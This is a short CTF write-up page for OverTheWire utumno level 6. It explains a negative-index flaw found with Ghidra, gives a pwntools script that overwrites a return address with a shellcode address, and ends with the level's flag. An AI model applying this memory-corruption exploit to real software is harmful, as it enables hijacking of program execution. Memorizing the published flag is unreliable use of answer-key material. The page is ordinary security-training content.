<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=cbdd8a6193c6d93e3fe2b2349fcd6a262aeb14c8">
    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>utumno6 | Avishai’s CTF Writeups</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="utumno6" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="…" />
<meta property="og:description" content="…" />
<link rel="canonical" href="http://localhost:4000/CTF_writeups/overthewire/utumno/utumno6.html" />
<meta property="og:url" content="http://localhost:4000/CTF_writeups/overthewire/utumno/utumno6.html" />
<meta property="og:site_name" content="Avishai’s CTF Writeups" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="utumno6" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"utumno6","url":"http://localhost:4000/CTF_writeups/overthewire/utumno/utumno6.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/CTF_writeups/">
          <h1>Avishai's CTF Writeups</h1>
        </a>
        <h2>...</h2>

        <section id="downloads">
          
          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <p>first i took the code and decompiled it using ghidra.
i can see integer overflow, that we can give it negative value and go back in the memory.
<img src="/CTF_writeups/overthewire/utumno/images/level6_1.png" alt="image" /></p>

<p>the idea behind the attack is to override where the return address is found, and put our shellcode address.
<img src="/CTF_writeups/overthewire/utumno/images/level6_2.png" alt="image" /></p>

<p>we can see that the address of the <code class="language-plaintext highlighter-rouge">auStack_34</code> is located in [ebp-0x34], so if we’ll set <code class="language-plaintext highlighter-rouge">arg1 = -1</code>, we can override the address. than, we need to find where on the stack the return address is found, take this memory location, and this will be the new address of our <code class="language-plaintext highlighter-rouge">auStack_34</code>
<img src="/CTF_writeups/overthewire/utumno/images/level6_3.png" alt="image" /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="n">buffer_address</span> <span class="o">=</span> <span class="mh">0xffffd2cc</span>
<span class="n">shellcode_address</span> <span class="o">=</span> <span class="mh">0xffffd53c</span>

<span class="n">arg1</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
<span class="n">arg2</span> <span class="o">=</span> <span class="n">buffer_address</span>
<span class="n">arg3</span> <span class="o">=</span> <span class="n">shellcode_address</span>


<span class="n">payload</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">arg1</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">' '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">arg2</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">' '</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">arg3</span><span class="p">)</span>

<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

</code></pre></div></div>
<p>.</p>

<p><img src="/CTF_writeups/overthewire/utumno/images/level6_4.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">VHOuCx7iA5</code></em></strong></p>

      </section>
    </div>
  </body>
</html>
